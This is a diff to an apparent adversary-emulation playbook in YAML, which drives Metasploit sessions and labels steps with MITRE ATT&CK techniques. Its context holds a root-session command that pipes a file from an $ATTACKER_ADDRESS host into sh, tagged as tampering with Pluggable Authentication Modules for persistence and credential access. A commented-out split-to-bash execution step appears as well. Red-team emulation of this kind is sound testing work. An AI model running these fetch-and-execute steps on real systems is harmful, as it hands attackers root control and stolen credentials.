@@ -64,7 +64,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -72,7 +72,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
@@ -259,10 +259,11 @@ commands:
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
-    metadata:
-      techniques: "T1105,T1218,T1556"
-      tactics: "Command and Control,Defense Evasion,Persistence,Credential Access"
- 
+     metadata:
+      techniques: "T1105,T1556.003"
+      tactics: "Command and Control,Persistence,Credential Access"
+      technique_name:"Ingress Tool Transfer,Modify Authentication Process: Pluggable Authentication Modules"
+
   - type: sleep
     seconds: 40
 
@@ -282,9 +283,10 @@ commands:
 #    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
 #    session: "root"
 #    metadata:
-#      techniques: "T1218,T1556"
+#      techniques: "T1218,T1556.003"
 #      tactics: "Defense Evasion,Persistence,Credential Access"
-#
+#      technique_name: "System Binary Proxy Execution,Modify Authentication Process: Pluggable Authentication Modules"
+
 
 #  - type: msf-session
 #    cmd: rm /root/README.txt
